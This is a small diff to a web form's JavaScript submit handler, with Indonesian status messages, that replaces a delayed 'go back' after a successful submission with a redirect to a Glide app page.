@@ -50,7 +50,7 @@
             .then(response => response.text())
             .then(data => {
                 document.getElementById("status").innerText = "Data Berhasil Disubmit!";
-                setTimeout(() => window.history.back(), 1000); // Kembali setelah 1 detik
+                window.location.href = "https://brinkssuperapp.glide.page/dl/da19fa";
             })
             .catch(error => {
                 document.getElementById("status").innerText = "Gagal Mengirim Data!";
